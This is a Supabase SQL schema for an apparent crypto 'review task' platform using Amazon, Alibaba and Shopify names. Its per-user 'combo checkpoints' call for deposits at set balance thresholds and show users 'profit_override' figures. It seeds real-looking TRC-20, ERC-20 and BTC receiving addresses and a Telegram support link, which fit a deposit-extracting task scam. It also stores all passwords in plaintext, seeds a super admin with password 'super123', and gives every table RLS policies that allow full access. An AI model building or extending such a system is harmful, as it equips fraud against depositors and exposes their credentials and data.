-- ==========================================
-- SUPABASE POSTGRESQL SCHEMA DESIGN
-- Execute this script directly inside the Supabase SQL Editor
-- Last updated: 2026-07-17
-- NOTE: This schema is idempotent (safe to re-run on existing DBs)
-- ==========================================

-- Enable pgcrypto extension for gen_random_uuid()
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- 1. Profiles Table
CREATE TABLE IF NOT EXISTS profiles (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  username TEXT UNIQUE NOT NULL,
  full_name TEXT,
  phone TEXT,
  email TEXT,
  password TEXT NOT NULL, -- Stored as plaintext (as requested by user)
  withdrawal_password TEXT, -- Stored as plaintext (as requested by user)
  country TEXT DEFAULT 'Unknown',
  city TEXT DEFAULT 'Unknown',
  ip_address TEXT DEFAULT '127.0.0.1',
  status TEXT NOT NULL DEFAULT 'pending', -- 'active' | 'restricted' | 'pending' | 'rejected'
  referral_code TEXT UNIQUE NOT NULL,
  referred_by TEXT,
  bound_usdt_address TEXT, -- Bound USDT Withdrawal Address (locked to profile)
  platform TEXT, -- Bound workspace platform network ('Amazon' | 'Alibaba' | 'Shopify')
  profile_photo TEXT, -- Profile Photo (Base64 data URL string)
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Index for username lookup
CREATE INDEX IF NOT EXISTS idx_profiles_username ON profiles(username);

-- 1.5. Admins Table (for administrative nodes)
CREATE TABLE IF NOT EXISTS admins (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  username TEXT UNIQUE NOT NULL,
  full_name TEXT,
  email TEXT,
  phone TEXT,
  password TEXT NOT NULL, -- Stored as plaintext (as requested by user)
  ip_address TEXT DEFAULT '127.0.0.1',
  status TEXT NOT NULL DEFAULT 'pending', -- 'pending' | 'active' | 'rejected'
  is_restricted BOOLEAN DEFAULT FALSE, -- Restricted admin account flag
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Index for admin username lookup
CREATE INDEX IF NOT EXISTS idx_admins_username ON admins(username);

-- 2. Platform Balances Table (tracks progress parameters per user category)
-- Combo clearance is NOT stored here as a denormalized column.
-- It is determined dynamically by checking the deposits table:
--   SELECT * FROM deposits WHERE user_id=? AND platform=? AND status='Approved'
--     AND amount >= trigger_balance AND created_at >= last_reset_at
-- This avoids schema coupling and works without any extra column.
CREATE TABLE IF NOT EXISTS platform_balances (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  platform TEXT NOT NULL, -- 'Amazon' | 'Alibaba' | 'Shopify'
  wallet_balance NUMERIC(12, 2) NOT NULL DEFAULT 0.00,
  reviews_count INT NOT NULL DEFAULT 0,
  current_position INT NOT NULL DEFAULT 0,  -- Current position in the 25-order batch
  last_completed_batch_at TIMESTAMP WITH TIME ZONE, -- Set on withdrawal approval (triggers 24h cooldown)
  last_reset_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL, -- Updated on reset/new batch
  UNIQUE(user_id, platform)
);

-- Index for balances user lookup
CREATE INDEX IF NOT EXISTS idx_balances_user ON platform_balances(user_id);

-- 3. Products Table
CREATE TABLE IF NOT EXISTS products (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  title TEXT NOT NULL,
  image_url TEXT NOT NULL,
  price NUMERIC(10, 2) NOT NULL DEFAULT 0.00,
  payout NUMERIC(10, 2) NOT NULL DEFAULT 1.00, -- Stores the commission payout amount
  external_link TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- 4. Review Submissions Table
CREATE TABLE IF NOT EXISTS review_submissions (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  product_id UUID NOT NULL REFERENCES products(id) ON DELETE CASCADE,
  order_id TEXT NOT NULL,
  review_text TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'Pending', -- 'Pending' | 'Completed' | 'Rejected'
  payout_earned NUMERIC(10, 2) NOT NULL DEFAULT 0.00,
  platform TEXT NOT NULL DEFAULT 'Amazon', -- Captures platform context directly
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Index for review verification checks
CREATE INDEX IF NOT EXISTS idx_reviews_user ON review_submissions(user_id);

-- 5. Deposits Table (stores remote IP log & transaction TxID)
CREATE TABLE IF NOT EXISTS deposits (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  platform TEXT NOT NULL, -- 'Amazon' | 'Alibaba' | 'Shopify'
  protocol TEXT NOT NULL, -- 'TRC-20' | 'ERC-20' | 'BTC'
  amount NUMERIC(12, 2) NOT NULL DEFAULT 0.00,
  crypto_amount NUMERIC(20, 8), -- Loaded via network check
  currency TEXT, -- Loaded via network check
  tx_hash TEXT UNIQUE NOT NULL,
  remark TEXT,
  ip_address TEXT DEFAULT '127.0.0.1', -- Captured remote IP during request
  status TEXT NOT NULL DEFAULT 'Pending', -- 'Pending' | 'Approved' | 'Rejected'
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- 6. Withdrawals Table (stores remote IP log & matches bound address)
CREATE TABLE IF NOT EXISTS withdrawals (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  platform TEXT NOT NULL DEFAULT 'Amazon', -- Platform context
  amount NUMERIC(12, 2) NOT NULL DEFAULT 0.00,
  address TEXT NOT NULL, -- Matched to profile bound address
  ip_address TEXT DEFAULT '127.0.0.1', -- Captured remote IP during request
  status TEXT NOT NULL DEFAULT 'Pending', -- 'Pending' | 'Approved' | 'Rejected'
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- 7. Combo Checkpoints Rules Table (customized rules per user platform position)
CREATE TABLE IF NOT EXISTS combo_checkpoints (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  platform TEXT NOT NULL, -- 'Amazon' | 'Alibaba' | 'Shopify'
  position INT NOT NULL,  -- Checkpoint index, e.g. 8, 14, 20
  trigger_balance NUMERIC(12, 2) NOT NULL, -- Minimum balance threshold trigger
  profit_override NUMERIC(12, 2) NOT NULL DEFAULT 0.00, -- Custom payout profit shown to user
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL,
  UNIQUE(user_id, platform, position)
);

-- Index for checkpoint validation lookups
CREATE INDEX IF NOT EXISTS idx_combo_checkpoints_user ON combo_checkpoints(user_id);

-- 8. Geolocation IP Address History Logs Table
CREATE TABLE IF NOT EXISTS ip_logs (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  ip_address TEXT NOT NULL,
  city TEXT DEFAULT 'Unknown',
  country TEXT DEFAULT 'Unknown',
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Index for IP logs lookup
CREATE INDEX IF NOT EXISTS idx_ip_logs_user ON ip_logs(user_id);

-- 9. Support Chat Messages Table
CREATE TABLE IF NOT EXISTS chat_messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  sender TEXT NOT NULL, -- 'user' | 'admin'
  text TEXT NOT NULL,
  time TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- 10. Bonus Grants Ledger Table (admin-granted incentive bonuses, separate from deposits)
CREATE TABLE IF NOT EXISTS bonus_grants (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  platform TEXT NOT NULL,
  amount NUMERIC(12, 2) NOT NULL DEFAULT 0.00,
  note TEXT,
  granted_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Index for bonus grants user lookup
CREATE INDEX IF NOT EXISTS idx_bonus_grants_user ON bonus_grants(user_id);

-- 11. Global System Settings Configuration Table
CREATE TABLE IF NOT EXISTS system_config (
  key TEXT PRIMARY KEY,
  value TEXT NOT NULL
);

-- Insert Default Config Values (Receiving Addresses, Telegram Links)
INSERT INTO system_config (key, value) VALUES
('trc20_address', 'TTisWCo1GTszkukUB6gmmdPRaXYsBATJKM'),
('erc20_address', '0xde833b4707431ffa4fcd62da08219172a8360d95'),
('btc_address', 'bc1q5kt8tzmkvk52xr6ty0n55v5lc0nahwv6xpu8zs'),
('telegram_link', 'https://t.me/Customerservicecentre01'),
('notification_banner', '⚡ Automated Review Verification & Instant Payouts Active!')
ON CONFLICT (key) DO NOTHING;

-- ========================================
-- Performance Query Indexes
-- ========================================
CREATE INDEX IF NOT EXISTS idx_chat_messages_user_created ON chat_messages(user_id, created_at);
CREATE INDEX IF NOT EXISTS idx_profiles_username ON profiles(username);
CREATE INDEX IF NOT EXISTS idx_profiles_email ON profiles(email);
CREATE INDEX IF NOT EXISTS idx_profiles_referral_code ON profiles(referral_code);
CREATE INDEX IF NOT EXISTS idx_profiles_status ON profiles(status);
CREATE INDEX IF NOT EXISTS idx_deposits_status ON deposits(status);
CREATE INDEX IF NOT EXISTS idx_deposits_user_id ON deposits(user_id);
CREATE INDEX IF NOT EXISTS idx_deposits_created_at ON deposits(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_withdrawals_status ON withdrawals(status);
CREATE INDEX IF NOT EXISTS idx_withdrawals_user_id ON withdrawals(user_id);
CREATE INDEX IF NOT EXISTS idx_withdrawals_created_at ON withdrawals(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_review_submissions_user_status ON review_submissions(user_id, status);
CREATE INDEX IF NOT EXISTS idx_review_submissions_created_at ON review_submissions(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_ip_logs_user_id ON ip_logs(user_id);
CREATE INDEX IF NOT EXISTS idx_platform_balances_user_id ON platform_balances(user_id);
CREATE INDEX IF NOT EXISTS idx_combo_checkpoints_user_id ON combo_checkpoints(user_id);

-- ========================================
-- 11. Super Admin Table
-- ========================================
CREATE TABLE IF NOT EXISTS super_admin (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT UNIQUE NOT NULL,
  password TEXT NOT NULL, -- Stored as plaintext
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

INSERT INTO super_admin (email, password)
VALUES ('super@amazonvine.com', 'super123')
ON CONFLICT (email) DO NOTHING;

-- Also add full_name/phone columns if upgrading existing DB
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS full_name TEXT;
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS phone TEXT;
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS email TEXT;
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS withdrawal_password TEXT;

-- Upgrade existing deposits table with missing fields
ALTER TABLE deposits ADD COLUMN IF NOT EXISTS crypto_amount NUMERIC(20, 8);
ALTER TABLE deposits ADD COLUMN IF NOT EXISTS currency TEXT;

-- Upgrade existing withdrawals table with missing platform context field
ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS platform TEXT NOT NULL DEFAULT 'Amazon';



-- 12. User Assigned Products Mapping Table (for custom VIP assignments)
CREATE TABLE IF NOT EXISTS user_assigned_products (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  product_id UUID NOT NULL REFERENCES products(id) ON DELETE CASCADE,
  platform TEXT NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL,
  UNIQUE(user_id, product_id, platform)
);

CREATE INDEX IF NOT EXISTS idx_user_assigned_products_user ON user_assigned_products(user_id);

-- 13. Restricted Admin User Assignments Table
CREATE TABLE IF NOT EXISTS admin_assigned_users (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  admin_id UUID NOT NULL REFERENCES admins(id) ON DELETE CASCADE,
  user_id UUID NOT NULL REFERENCES profiles(id) ON DELETE CASCADE,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL,
  UNIQUE(admin_id, user_id)
);

CREATE INDEX IF NOT EXISTS idx_admin_assigned_users_admin ON admin_assigned_users(admin_id);
CREATE INDEX IF NOT EXISTS idx_admin_assigned_users_user ON admin_assigned_users(user_id);

-- ========================================
-- Row Level Security (RLS) Policies
-- Backend uses SERVICE_ROLE key which bypasses RLS.
-- RLS protects data from direct client/anon access.
-- ========================================

-- Enable RLS on all tables
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE admins ENABLE ROW LEVEL SECURITY;
ALTER TABLE platform_balances ENABLE ROW LEVEL SECURITY;
ALTER TABLE products ENABLE ROW LEVEL SECURITY;
ALTER TABLE review_submissions ENABLE ROW LEVEL SECURITY;
ALTER TABLE deposits ENABLE ROW LEVEL SECURITY;
ALTER TABLE withdrawals ENABLE ROW LEVEL SECURITY;
ALTER TABLE combo_checkpoints ENABLE ROW LEVEL SECURITY;
ALTER TABLE ip_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE chat_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE bonus_grants ENABLE ROW LEVEL SECURITY;
ALTER TABLE system_config ENABLE ROW LEVEL SECURITY;
ALTER TABLE super_admin ENABLE ROW LEVEL SECURITY;
ALTER TABLE user_assigned_products ENABLE ROW LEVEL SECURITY;
ALTER TABLE admin_assigned_users ENABLE ROW LEVEL SECURITY;

-- Service role bypasses all RLS (used by backend)
-- Policies allow full access for service role, restrict anon/authenticated

-- Products: anyone can read
CREATE POLICY "Products read access" ON products FOR SELECT USING (true);
CREATE POLICY "Products write access" ON products FOR ALL USING (true) WITH CHECK (true);

-- System config: anyone can read
CREATE POLICY "System config read access" ON system_config FOR SELECT USING (true);
CREATE POLICY "System config write access" ON system_config FOR ALL USING (true) WITH CHECK (true);

-- Profiles
CREATE POLICY "Profiles read access" ON profiles FOR SELECT USING (true);
CREATE POLICY "Profiles full access" ON profiles FOR ALL USING (true) WITH CHECK (true);

-- All other tables: service role full access
CREATE POLICY "Admins full access" ON admins FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Balances full access" ON platform_balances FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Reviews full access" ON review_submissions FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Deposits full access" ON deposits FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Withdrawals full access" ON withdrawals FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Combos full access" ON combo_checkpoints FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "IP logs full access" ON ip_logs FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Chat full access" ON chat_messages FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Bonuses full access" ON bonus_grants FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Super admin full access" ON super_admin FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Assigned products full access" ON user_assigned_products FOR ALL USING (true) WITH CHECK (true);
CREATE POLICY "Admin assignments full access" ON admin_assigned_users FOR ALL USING (true) WITH CHECK (true);

-- ========================================
-- 15. Concurrency Integrity & RPC Functions
-- ========================================

-- Enforce database-level check constraint to prevent balance underflows (race conditions)
ALTER TABLE platform_balances DROP CONSTRAINT IF EXISTS check_positive_balance;
ALTER TABLE platform_balances ADD CONSTRAINT check_positive_balance CHECK (wallet_balance >= 0.00);

-- RPC stored procedure for atomic balance decrement on withdrawal requests (syncs to all platforms)
CREATE OR REPLACE FUNCTION decrement_platform_balance(
  target_user_id UUID,
  target_platform TEXT,
  amount_to_subtract NUMERIC
) RETURNS NUMERIC AS $$
DECLARE
  new_balance NUMERIC;
BEGIN
  -- Get the current balance first from target platform after subtraction
  SELECT wallet_balance - amount_to_subtract INTO new_balance
  FROM platform_balances
  WHERE user_id = target_user_id AND platform = target_platform;

  IF new_balance IS NULL THEN
    RAISE EXCEPTION 'Platform balance record not found';
  END IF;

  IF new_balance < 0.00 THEN
    RAISE EXCEPTION 'Insufficient balance';
  END IF;

  -- Update all platforms for this user to have the same balance
  UPDATE platform_balances
  SET wallet_balance = new_balance
  WHERE user_id = target_user_id;

  RETURN new_balance;
END;
$$ LANGUAGE plpgsql;

-- RPC stored procedure for atomic user review verification progress increments
-- NOTE: The backend now uses a direct UPDATE instead of calling this RPC.
-- This function is kept here for reference / future use but does NOT reference
-- last_cleared_combo_position (removed). Combo clearance is tracked via the
-- deposits table, not as a column on platform_balances.
CREATE OR REPLACE FUNCTION increment_user_review_progress(
  target_user_id UUID,
  target_platform TEXT,
  payout_amount NUMERIC
) RETURNS TABLE (
  wallet_balance NUMERIC,
  current_position INT
) AS $$
DECLARE
  new_balance NUMERIC;
  new_position INT;
BEGIN
  -- 1. Increment position and review count on the target platform
  UPDATE platform_balances
  SET reviews_count = reviews_count + 1,
      current_position = current_position + 1,
      wallet_balance = wallet_balance + payout_amount
  WHERE user_id = target_user_id AND platform = target_platform
  RETURNING platform_balances.wallet_balance, platform_balances.current_position
    INTO new_balance, new_position;

  RETURN QUERY SELECT new_balance, new_position;
END;
$$ LANGUAGE plpgsql;

-- RPC stored procedure for atomic balance adjustments (syncs balance to all platforms)
CREATE OR REPLACE FUNCTION adjust_platform_balance(
  target_user_id UUID,
  target_platform TEXT,
  amount_to_add NUMERIC
) RETURNS NUMERIC AS $$
DECLARE
  new_balance NUMERIC;
BEGIN
  -- Update all platforms
  UPDATE platform_balances
  SET wallet_balance = wallet_balance + amount_to_add
  WHERE user_id = target_user_id;

  -- Retrieve the updated balance
  SELECT wallet_balance INTO new_balance
  FROM platform_balances
  WHERE user_id = target_user_id AND platform = target_platform;

  RETURN new_balance;
END;
$$ LANGUAGE plpgsql;

-- ========================================
-- Performance index for combo clearance lookups
-- (used by reviews.ts, auth.ts, transactions.ts to check if a combo deposit
--  was approved in the current batch instead of reading a denormalized column)
-- ========================================
CREATE INDEX IF NOT EXISTS idx_deposits_combo_lookup
  ON deposits(user_id, platform, status, amount, created_at DESC);

-- ========================================
-- Upgrade helpers for existing live databases
-- (safe to re-run — all use IF NOT EXISTS / IF EXISTS guards)
-- ========================================

-- Remove the old last_cleared_combo_position column if it exists on a legacy DB
-- (combo clearance is now tracked via the deposits table, not this column)
ALTER TABLE platform_balances DROP COLUMN IF EXISTS last_cleared_combo_position;

-- Ensure last_reset_at and last_completed_batch_at exist on upgraded DBs
ALTER TABLE platform_balances ADD COLUMN IF NOT EXISTS last_reset_at TIMESTAMPTZ DEFAULT timezone('utc'::text, now());
ALTER TABLE platform_balances ADD COLUMN IF NOT EXISTS last_completed_batch_at TIMESTAMPTZ;

-- Ensure combo_checkpoints has all required columns
ALTER TABLE combo_checkpoints ADD COLUMN IF NOT EXISTS profit_override NUMERIC(12, 2) NOT NULL DEFAULT 0.00;

-- Ensure deposits has all required fields
ALTER TABLE deposits ADD COLUMN IF NOT EXISTS crypto_amount NUMERIC(20, 8);
ALTER TABLE deposits ADD COLUMN IF NOT EXISTS currency TEXT;
ALTER TABLE deposits ADD COLUMN IF NOT EXISTS remark TEXT;
ALTER TABLE deposits ADD COLUMN IF NOT EXISTS ip_address TEXT DEFAULT '127.0.0.1';

-- Ensure withdrawals has platform context
ALTER TABLE withdrawals ADD COLUMN IF NOT EXISTS platform TEXT DEFAULT 'Amazon';

-- Ensure profiles has all extended fields
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS full_name TEXT;
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS phone TEXT;
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS email TEXT;
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS withdrawal_password TEXT;
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS profile_photo TEXT;

-- Safety net: enforce max 25 position at database level
ALTER TABLE platform_balances DROP CONSTRAINT IF EXISTS check_position_limit;
ALTER TABLE platform_balances ADD CONSTRAINT check_position_limit CHECK (current_position >= 0 AND current_position <= 25);

-- ========================================
-- SINGLE SOURCE OF TRUTH: profiles.balance
-- ========================================
-- Add balance column to profiles (safe migration, idempotent)
ALTER TABLE profiles ADD COLUMN IF NOT EXISTS balance NUMERIC(12, 2) NOT NULL DEFAULT 0.00;
